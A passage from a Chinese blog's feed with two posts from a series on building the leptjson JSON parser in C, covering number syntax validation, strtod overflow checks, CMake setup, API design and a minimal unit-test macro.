并存储 negative, mantissa, exp */</span></span><br><span class="line">v-&gt;n = (negative ? -mantissa : mantissa) * <span class="built_in">pow</span>(<span class="number">10.0</span>, <span class="built_in">exp</span>);</span><br></pre></td></tr></table></figure><p>这种做法会有精度问题。实现正确的答案是很复杂的，RapidJSON 的初期版本也是 naive 的，后来 RapidJSON 就内部实现了三种算法（使用 <code>kParseFullPrecision</code> 选项开启），最后一种算法用到了大整数（高精度计算）。有兴趣的同学也可以先尝试做一个 naive 版本，不使用 <code>strtod()</code>。之后可再参考 Google 的 <a href="https://github.com/google/double-conversion">double-conversion</a> 开源项目及相关论文。</p><ol start="3"><li>*去掉 <code>test_parse_invalid_value()</code> 和 <code>test_parse_root_not_singular</code> 中的 <code>#if 0 ... #endif</code>，执行测试，证实测试失败。按 JSON number 的语法在 lept_parse_number() 校验，不符合标准的情况返回 <code>LEPT_PARSE_INVALID_VALUE</code> 错误码，即要排除掉那些strtod能够转换但在json中不合法的数字形式。</li></ol><p>（提示：要校验 JSON 的数字语法。建议可使用以下两个宏去简化一下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISDIGIT(ch)         ((ch) &gt;= <span class="meta-string">&#x27;0&#x27;</span> &amp;&amp; (ch) &lt;= <span class="meta-string">&#x27;9&#x27;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISDIGIT1TO9(ch)     ((ch) &gt;= <span class="meta-string">&#x27;1&#x27;</span> &amp;&amp; (ch) &lt;= <span class="meta-string">&#x27;9&#x27;</span>)</span></span><br></pre></td></tr></table></figure><p>另一提示：在校验成功以后，我们不再使用 <code>end</code> 指针去检测 <code>strtod()</code> 的正确性，第二个参数可传入 <code>NULL</code>。）</p><p>首先，如同 <code>lept_parse_whitespace()</code>，我们使用一个指针 <code>p</code> 来表示当前的解析字符位置。这样做有两个好处，一是代码更简单，二是在某些编译器下性能更好（因为不能确定 <code>c</code> 会否被改变，从而每次更改 <code>c-&gt;json</code> 都要做一次间接访问）。如果校验成功，才把 <code>p</code> 赋值至 <code>c-&gt;json</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_number</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* p = c-&gt;json;</span><br><span class="line">    <span class="comment">/* 负号 ... */</span></span><br><span class="line">    <span class="comment">/* 整数 ... */</span></span><br><span class="line">    <span class="comment">/* 小数 ... */</span></span><br><span class="line">    <span class="comment">/* 指数 ... */</span></span><br><span class="line">    v-&gt;n = strtod(c-&gt;json, <span class="literal">NULL</span>);</span><br><span class="line">    v-&gt;type = LEPT_NUMBER;</span><br><span class="line">    c-&gt;json = p;</span><br><span class="line">    <span class="keyword">return</span> LEPT_PARSE_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们把语法再看一遍：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">number</span> = [ <span class="string">&quot;-&quot;</span> ] int [ frac ] [ exp ]</span><br><span class="line"><span class="attr">int</span> = <span class="string">&quot;0&quot;</span> / digit1-<span class="number">9</span> *digit</span><br><span class="line"><span class="attr">frac</span> = <span class="string">&quot;.&quot;</span> <span class="number">1</span>*digit</span><br><span class="line"><span class="attr">exp</span> = (<span class="string">&quot;e&quot;</span> / <span class="string">&quot;E&quot;</span>) [<span class="string">&quot;-&quot;</span> / <span class="string">&quot;+&quot;</span>] <span class="number">1</span>*digit</span><br></pre></td></tr></table></figure><p>负号最简单，有的话跳过便行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (*p == <span class="string">&#x27;-&#x27;</span>) p++;</span><br></pre></td></tr></table></figure><p>整数部分有两种合法情况，一是单个 <code>0</code>，否则是一个 1-9 再加上任意数量的 digit。对于第一种情况，我们像负号般跳过便行。对于第二种情况，第一个字符必须为 1-9，如果否定的就是不合法的，可立即返回错误码。然后，有多少个 digit 就跳过多少个。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (*p == <span class="string">&#x27;0&#x27;</span>) p++;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!ISDIGIT1TO9(*p)) <span class="keyword">return</span> LEPT_PARSE_INVALID_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (p++; ISDIGIT(*p); p++);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果出现小数点，我们跳过该小数点，然后检查它至少应有一个 digit，不是 digit 就返回错误码。跳过首个 digit，我们再检查有没有 digit，有多少个跳过多少个。这里用了 for 循环技巧来做这件事。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (*p == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">    p++;</span><br><span class="line">    <span class="keyword">if</span> (!ISDIGIT(*p)) <span class="keyword">return</span> LEPT_PARSE_INVALID_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (p++; ISDIGIT(*p); p++);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，如果出现大小写 <code>e</code>，就表示有指数部分。跳过那个 <code>e</code> 之后，可以有一个正或负号，有的话就跳过。然后和小数的逻辑是一样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (*p == <span class="string">&#x27;e&#x27;</span> || *p == <span class="string">&#x27;E&#x27;</span>) &#123;</span><br><span class="line">    p++;</span><br><span class="line">    <span class="keyword">if</span> (*p == <span class="string">&#x27;+&#x27;</span> || *p == <span class="string">&#x27;-&#x27;</span>) p++;</span><br><span class="line">    <span class="keyword">if</span> (!ISDIGIT(*p)) <span class="keyword">return</span> LEPT_PARSE_INVALID_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (p++; ISDIGIT(*p); p++);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用了 18 行代码去做这个校验。当中把一些 if 用一行来排版，而没用采用传统两行缩进风格，我个人认为在不影响阅读时可以这样弹性处理。当然那些 for 也可分拆成三行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p++;</span><br><span class="line"><span class="keyword">while</span> (ISDIGIT(*p))</span><br><span class="line">    p++;</span><br></pre></td></tr></table></figure><ol start="4"><li>去掉 <code>test_parse_number_too_big</code> 中的 <code>#if 0 ... #endif</code>，执行测试，证实测试失败。仔细阅读 <a href="https://en.cppreference.com/w/c/string/byte/strtof"><code>strtod()</code></a>，看看怎样从返回值得知数值是否过大，以返回 <code>LEPT_PARSE_NUMBER_TOO_BIG</code> 错误码。（提示：这里需要 <code>#include</code> 额外两个标准库头文件。）</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;   /* errno, ERANGE */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;    /* HUGE_VAL */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_number</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    v-&gt;n = strtod(c-&gt;json, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (errno == ERANGE &amp;&amp; v-&gt;n == HUGE_VAL) <span class="keyword">return</span> LEPT_PARSE_NUMBER_TOO_BIG;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>许多时候课本／书籍也不会把每个标准库功能说得很仔细，我想藉此提醒同学要好好看参考文档，学会读文档编程就简单得多！<a href="https://cppreference.com/">cppreference.com</a> 是 C/C++ 程序员的宝库。</p><blockquote><p>strtod()：</p><p>“If the converted value falls out of range of corresponding return type, range error occurs and <a href="https://en.cppreference.com/w/c/numeric/math/HUGE_VAL">HUGE_VAL</a>, <a href="https://en.cppreference.com/w/c/numeric/math/HUGE_VAL">HUGE_VALF</a> or <a href="https://en.cppreference.com/w/c/numeric/math/HUGE_VAL">HUGE_VALL</a> is returned. “</p><p>errno.h：</p><p><a href="https://en.cppreference.com/w/c/error/errno"><strong>errno</strong></a>  macro which expands to POSIX-compatible thread-local error number variable (macro variable)</p><p><strong>ERANGE</strong>  Result too large (macro constant)</p><p>math.h：</p><p><strong>HUGE_VAL</strong>  Expands to positive double expression that indicates overflow, not necessarily representable as a float</p></blockquote><h1 id="六、Q-amp-A"><a href="#六、Q-amp-A" class="headerlink" title="六、Q &amp; A"></a>六、Q &amp; A</h1><ol><li><p>为什么要把一些测试代码以 <code>#if 0 ... #endif</code> 禁用？</p><p>因为在做第 1 个练习题时，我希望能 100% 通过测试，方便做重构。另外，使用 <code>#if 0 ... #endif</code> 而不使用 <code>/* ... */</code>，是因为 C 的注释不支持嵌套（nested），而 <code>#if ... #endif</code> 是支持嵌套的。代码中已有注释时，用 <code>#if 0 ... #endif</code> 去禁用代码是一个常用技巧，而且可以把 <code>0</code> 改为 <code>1</code> 去恢复。</p></li><li><p>科学计数法的指数部分没有对前导零作限制吗？<code>1E012</code> 也是合法的吗？</p><p>是的，这是合法的。JSON 源自于 JavaScript（[ECMA-262, 3rd edition](<a href="https://www.ecma-international.org/publications/files/ECMA-ST-ARCH/ECMA-262">https://www.ecma-international.org/publications/files/ECMA-ST-ARCH/ECMA-262</a>, 3rd edition, December 1999.pdf)），数字语法取自 JavaScript 的十进位数字的语法（§7.8.3 Numeric Literals）。整数不容许前导零（leading zero），是因为更久的 JavaScript 版本容许以前导零来表示八进位数字，如 <code>052 == 42</code>，这种八进位常数表示方式来自于 <a href="https://en.cppreference.com/w/c/language/integer_constant">C 语言</a>。禁止前导零避免了可能出现的歧义。但是在指数里就不会出现这个问题。</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;跟着github上的项目json-tutorial完成一个json解析器。本文对应该项目的第二单元，重点在于解析 JSON number 类型。&lt;/p&gt;</summary>
    
    
    
    <category term="项目" scheme="https://www.fvolcano.red/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="json" scheme="https://www.fvolcano.red/tags/json/"/>
    
  </entry>
  
  <entry>
    <title>跟着做一个JSON解析器（一）</title>
    <link href="https://www.fvolcano.red/2021/Make-a-JSON-parser-1/"/>
    <id>https://www.fvolcano.red/2021/Make-a-JSON-parser-1/</id>
    <published>2021-07-10T06:29:29.000Z</published>
    <updated>2021-07-10T06:29:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>跟着github上的项目json-tutorial完成一个json解析器。本文对应该项目的第一单元。<a id="more"></a></p><p>👉<a href="https://github.com/miloyip/json-tutorial">原项目地址</a></p><h1 id="JSON是什么"><a href="#JSON是什么" class="headerlink" title="JSON是什么"></a>JSON是什么</h1><p>JSON（JavaScript Object Notation）是一个用于数据交换的文本格式，现时的标准为<a href="https://www.ecma-international.org/publications/files/ECMA-ST/ECMA-404.pdf">ECMA-404</a>。</p><p>虽然 JSON 源至于 JavaScript 语言，但它只是一种数据格式，可用于任何编程语言。现时具类似功能的格式有 XML、YAML，当中以 JSON 的语法最为简单。</p><p>例如，一个动态网页想从服务器获得数据时，服务器从数据库查找数据，然后把数据转换成 JSON 文本格式：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;Design Patterns&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;subtitle&quot;</span>: <span class="string">&quot;Elements of Reusable Object-Oriented Software&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;author&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;Erich Gamma&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Richard Helm&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Ralph Johnson&quot;</span>,</span><br><span class="line">        <span class="string">&quot;John Vlissides&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;year&quot;</span>: <span class="number">2009</span>,</span><br><span class="line">    <span class="attr">&quot;weight&quot;</span>: <span class="number">1.8</span>,</span><br><span class="line">    <span class="attr">&quot;hardcover&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;publisher&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;Company&quot;</span>: <span class="string">&quot;Pearson Education&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;Country&quot;</span>: <span class="string">&quot;India&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;website&quot;</span>: <span class="literal">null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网页的脚本代码就可以把此 JSON 文本解析为内部的数据结构去使用。</p><p>从此例子可看出，JSON 是树状结构，而 JSON 只包含 6 种数据类型：</p><ul><li>null: 表示为 null</li><li>boolean: 表示为 true 或 false</li><li>number: 一般的浮点数表示方式，在下一单元详细说明</li><li>string: 表示为 “…”</li><li>array: 表示为 [ … ]</li><li>object: 表示为 { … }</li></ul><h1 id="目标：简单而基本"><a href="#目标：简单而基本" class="headerlink" title="目标：简单而基本"></a>目标：简单而基本</h1><p>我们要实现的 JSON 库，主要是完成 3 个需求：</p><ol><li>把 JSON 文本解析为一个树状数据结构（parse）。</li><li>提供接口访问该数据结构（access）。</li><li>把数据结构转换成 JSON 文本（stringify）。</li></ol><p><a href="https://github.com/Buland-RAn/json-tutorial/blob/master/tutorial01/images/requirement.png"><img src="https://github.com/Buland-RAn/json-tutorial/raw/master/tutorial01/images/requirement.png" alt="requirement"></a></p><h1 id="开始：fork项目自己做"><a href="#开始：fork项目自己做" class="headerlink" title="开始：fork项目自己做"></a>开始：fork项目自己做</h1><p>点击json-tutorial项目的fork后，在本地clone：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:yourname/json-tutorial.git</span><br></pre></td></tr></table></figure><p><img src="/2021/Make-a-JSON-parser-1/image-20210710143417392.png" alt="image-20210710143417392"></p><p><code>cd</code> 进入你的工作目录，可以看待git bash命令提示符后面有(master)标识，说明此时我们处在master分支上。</p><p>用git remote -v命令可以查看该本地仓库关联的远程仓库：</p><p><img src="/2021/Make-a-JSON-parser-1/image-20210710143652754.png" alt="image-20210710143652754"></p><p>其中，<strong>origin</strong> 为远程地址的别名，后面为远程仓库的url。</p><p>我们的 JSON 库名为 leptjson，代码文件只有 3 个：</p><ol><li><code>leptjson.h</code>：leptjson 的头文件（header file），含有对外的类型和 API 函数声明。</li><li><code>leptjson.c</code>：leptjson 的实现文件（implementation file），含有内部的类型声明和函数实现。此文件会编译成库。</li><li><code>test.c</code>：我们使用测试驱动开发（test driven development, TDD）。此文件包含测试程序，需要链接 leptjson 库。</li></ol><h1 id="一、编译环境搭建"><a href="#一、编译环境搭建" class="headerlink" title="一、编译环境搭建"></a>一、编译环境搭建</h1><p>安装CMake后，使用其cmake-gui程序：</p><p><img src="/2021/Make-a-JSON-parser-1/image-20210710145207755.png" alt="image-20210710145207755"></p><p>先在 “Where is the source code” 选择 json-tutorial/tutorial01，再在 “Where to build the binary” 键入上一个目录加上 /build：</p><p><img src="/2021/Make-a-JSON-parser-1/image-20210710150346431.png" alt="image-20210710150346431"></p><p>在选择generator的地方要选择你电脑中安装的vs版本，否则会失败，若选择错误，可以在file-&gt;delete cache中重置：</p><p><img src="/2021/Make-a-JSON-parser-1/image-20210710150217094.png" alt="image-20210710150217094"></p><p>配置完成：</p><p><img src="/2021/Make-a-JSON-parser-1/image-20210710150413104.png" alt="image-20210710150413104"></p><p>编译运行leptjson_test后若出现下面结果说明已经成功搭建好编译环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/路径/json-tutorial/tutorial01/test.c:56: expect: 3 actual: 0</span><br><span class="line">11/12 (91.67%) passed</span><br></pre></td></tr></table></figure><h1 id="二、头文件与API设计"><a href="#二、头文件与API设计" class="headerlink" title="二、头文件与API设计"></a>二、头文件与API设计</h1><p>由于头文件也可以 <code>#include</code> 其他头文件，为避免重复声明，通常会利用宏加入 include 防范（include guard）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LEPTJSON_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEPTJSON_H__</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* LEPTJSON_H__ */</span></span></span><br></pre></td></tr></table></figure><p>如前所述，JSON 中有 6 种数据类型，如果把 true 和 false 当作两个类型就是 7 种，我们为此声明一个枚举类型（enumeration type）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123; </span><br><span class="line">    LEPT_NULL, </span><br><span class="line">    LEPT_FALSE, </span><br><span class="line">    LEPT_TRUE, </span><br><span class="line">    LEPT_NUMBER, </span><br><span class="line">    LEPT_STRING, </span><br><span class="line">    LEPT_ARRAY, </span><br><span class="line">    LEPT_OBJECT </span><br><span class="line">&#125; lept_type;</span><br></pre></td></tr></table></figure><p>接下来，我们声明 JSON 的数据结构。JSON 是一个树形结构，我们最终需要实现一个树的数据结构，每个节点使用 <code>lept_value</code> 结构体表示，我们会称它为一个 JSON 值（JSON value）。 在此单元中，我们只需要实现 null, true 和 false 的解析，因此该结构体只需要存储一个 lept_type。之后的单元会逐步加入其他数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    lept_type type;</span><br><span class="line">&#125;lept_value;</span><br></pre></td></tr></table></figure><p>先定义两个API：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lept_parse</span><span class="params">(lept_value* v, <span class="keyword">const</span> <span class="keyword">char</span>* json)</span></span>;</span><br><span class="line"><span class="function">lept_type <span class="title">lept_get_type</span><span class="params">(<span class="keyword">const</span> lept_value* v)</span></span>;</span><br></pre></td></tr></table></figure><p>前一个函数用来解析json，参数json是不应该被改动的，所以使用<code>const char*</code> 类型。返回值是以下这些枚举值，无错误会返回 <code>LEPT_PARSE_OK</code>，其他值在后面解释。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> &#123;</span><br><span class="line">    LEPT_PARSE_OK = <span class="number">0</span>,</span><br><span class="line">    LEPT_PARSE_EXPECT_VALUE,</span><br><span class="line">    LEPT_PARSE_INVALID_VALUE,</span><br><span class="line">    LEPT_PARSE_ROOT_NOT_SINGULAR</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>后一个函数用来获取该<code>lept_value</code>节点的数据类型。</p><h1 id="三、JSON-语法子集"><a href="#三、JSON-语法子集" class="headerlink" title="三、JSON 语法子集"></a>三、JSON 语法子集</h1><p>下面是此单元的 JSON 语法子集，使用 <a href="https://tools.ietf.org/html/rfc7159">RFC7159</a> 中的 <a href="https://tools.ietf.org/html/rfc5234">ABNF</a> 表示：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">JSON-text</span> = ws value ws</span><br><span class="line"><span class="attr">ws</span> = *(%x20 / %x09 / %x0A / %x0D)</span><br><span class="line"><span class="attr">value</span> = null / <span class="literal">false</span> / <span class="literal">true</span> </span><br><span class="line"><span class="attr">null</span>  = <span class="string">&quot;null&quot;</span></span><br><span class="line"><span class="attr">false</span> = <span class="string">&quot;false&quot;</span></span><br><span class="line"><span class="attr">true</span>  = <span class="string">&quot;true&quot;</span></span><br></pre></td></tr></table></figure><p>当中 <code>%xhh</code> 表示以 16 进制表示的字符，<code>/</code> 是多选一，<code>*</code> 是零或多个，<code>()</code> 用于分组。</p><p>那么第一行的意思是，JSON 文本由 3 部分组成，首先是空白（whitespace），接着是一个值，最后是空白。</p><p>第二行告诉我们，所谓空白，是由零或多个空格符（space U+0020）、制表符（tab U+0009）、换行符（LF U+000A）、回车符（CR U+000D）所组成。</p><p>第三行是说，我们现时的值只可以是 null、false 或 true，它们分别有对应的字面值（literal）。</p><p>我们的解析器应能判断输入是否一个合法的 JSON。如果输入的 JSON 不合符这个语法，我们要产生对应的错误码，方便使用者追查问题。</p><p>在这个 JSON 语法子集下，我们定义 3 种错误码：</p><ul><li>若一个 JSON 只含有空白，传回 <code>LEPT_PARSE_EXPECT_VALUE</code>。</li><li>若一个值之后，在空白之后还有其他字符，传回 <code>LEPT_PARSE_ROOT_NOT_SINGULAR</code>。</li><li>若值不是那三种字面值，传回 <code>LEPT_PARSE_INVALID_VALUE</code>。</li></ul><h1 id="四、单元测试"><a href="#四、单元测试" class="headerlink" title="四、单元测试"></a>四、单元测试</h1><p>为了简单起见，编写一个极简单的单元测试方式。无论我们是采用 TDD（test-driven development），或是先实现后测试，都应尽量加入足够覆盖率的单元测试。</p><p>回到 leptjson 项目，<code>test.c</code> 包含了一个极简的单元测试框架：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;leptjson.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> main_ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> test_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> test_pass = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_EQ_BASE(equality, expect, actual, format) \</span></span><br><span class="line">    <span class="keyword">do</span> &#123;\</span><br><span class="line">        test_count++;\</span><br><span class="line">        <span class="keyword">if</span> (equality)\</span><br><span class="line">            test_pass++;\</span><br><span class="line">        <span class="keyword">else</span> &#123;\</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s:%d: expect: &quot;</span> format <span class="string">&quot; actual: &quot;</span> format <span class="string">&quot;\n&quot;</span>, __FILE__, __LINE__, expect, actual);\</span><br><span class="line">            main_ret = <span class="number">1</span>;\</span><br><span class="line">        &#125;\</span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_EQ_INT(expect, actual) EXPECT_EQ_BASE((expect) == (actual), expect, actual, <span class="meta-string">&quot;%d&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_parse_null</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    lept_value v;</span><br><span class="line">    v.type = LEPT_TRUE;</span><br><span class="line">    EXPECT_EQ_INT(LEPT_PARSE_OK, lept_parse(&amp;v, <span class="string">&quot;null&quot;</span>));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_NULL, lept_get_type(&amp;v));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_parse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    test_parse_null();</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    test_parse();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d/%d (%3.2f%%) passed\n&quot;</span>, test_pass, test_count, test_pass * <span class="number">100.0</span> / test_count);</span><br><span class="line">    <span class="keyword">return</span> main_ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现时只提供了一个 <code>EXPECT_EQ_INT(expect, actual)</code> 的宏，每次使用这个宏时，如果 expect != actual（预期值不等于实际值），便会输出错误信息。 若按照 TDD 的步骤，我们先写一个测试，如上面的 <code>test_parse_null()</code>，而 <code>lept_parse()</code> 只返回 <code>LEPT_PARSE_OK</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/路径/json-tutorial/tutorial01/test.c:27: expect: 0 actual: 1</span><br><span class="line">1/2 (50.00%) passed</span><br></pre></td></tr></table></figure><p>第一个返回 <code>LEPT_PARSE_OK</code>，所以是通过的。第二个测试因为 <code>lept_parse()</code> 没有把 <code>v.type</code> 改成 <code>LEPT_NULL</code>，造成失败。我们再实现 <code>lept_parse()</code> 令到它能通过测试。</p><h2 id="宏的编写技巧-EXPECT-EQ-BASE解析"><a href="#宏的编写技巧-EXPECT-EQ-BASE解析" class="headerlink" title="宏的编写技巧: EXPECT_EQ_BASE解析"></a>宏的编写技巧: EXPECT_EQ_BASE解析</h2><p>反斜线代表该行未结束，会串接下一行。而如果宏里有多过一个语句（statement），就需要用 <code>do &#123; /*...*/ &#125; while(0)</code> 包裹成单个语句，否则会有如下的问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 